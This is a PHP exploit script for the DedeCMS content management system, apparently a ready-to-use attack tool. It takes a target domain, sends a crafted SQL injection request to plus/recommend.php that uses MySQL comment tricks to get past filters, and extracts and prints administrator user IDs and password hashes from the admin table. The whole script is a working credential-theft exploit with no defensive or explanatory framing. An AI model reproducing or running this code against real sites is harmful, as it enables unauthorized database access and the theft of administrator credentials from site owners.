<?php
print_r(
"
+------------------------------------+
DEDECMS
code by :Sunshie
Usage:$argv[0] <domain>
Example: php.exe$argv[0] www.phpinfo.me
+------------------------------------+
"
);
if($argv[1]==""){
exit("no url");
}else{
  
  $sb=$argv[1];
  echo"Explot....\n";
  $exp=@file_get_contents("http://$sb//plus/recommend.php?aid=1&_FILES[type][name]&_FILES[type][size]&_FILES[type][type]&_FILES[type][tmp_name]=aa\'and+char(@`'`)+/*!50000Union*/+/*!50000SeLect*/+1,2,3,concat(0x3C6162633E,group_concat(0x7C,userid,0x3a,pwd,0x7C),0x3C2F6162633E),5,6,7,8,9%20from%20`%23@__admin`%23");
   
    
    if(!$exp)echo"no url";
      
        
        eregi("_<abc>(.*)</abc>_",$exp,$arr);
        if(!$arr[0])echo"no url";
        $exploit=str_replace("_<abc>","==fuck",$arr[0]);
        $exploit=str_replace("</abc>_","fuck==",$exploit);
        echo$exploit;
        }
          
          ?>
